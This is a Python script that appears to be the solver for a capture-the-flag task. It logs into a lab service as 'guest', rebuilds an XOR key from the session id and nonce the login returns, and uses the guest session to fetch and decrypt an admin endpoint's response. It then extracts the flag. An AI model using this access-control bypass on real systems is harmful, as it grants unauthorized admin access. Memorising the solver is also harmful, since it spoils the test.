#!/usr/bin/env python3
from __future__ import annotations

import hashlib
import json
import os
import pathlib
import sys
import urllib.request


def main() -> int:
    app_dir = pathlib.Path(sys.argv[1]) if len(sys.argv) > 1 else pathlib.Path("/app")
    target = os.environ.get("TARGET_URL", "http://target:5000")

    login_payload = json.dumps(
        {"username": "guest", "password": "guest"}
    ).encode()
    login_req = urllib.request.Request(
        f"{target}/api/login",
        data=login_payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(login_req, timeout=30) as resp:
        creds = json.loads(resp.read())

    session_id = creds["session_id"]
    nonce = creds["nonce"]

    key = hashlib.sha256((session_id + nonce).encode()).digest()

    admin_req = urllib.request.Request(
        f"{target}/api/admin",
        headers={"X-Session-Id": session_id},
    )
    with urllib.request.urlopen(admin_req, timeout=30) as resp:
        encrypted = resp.read()

    decrypted = bytes(
        b ^ key[i % len(key)] for i, b in enumerate(encrypted)
    ).decode("utf-8", errors="replace")

    parts = decrypted.split("|")
    flag = parts[2]

    output = app_dir / "flags.txt"
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_text(flag + "\n")
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())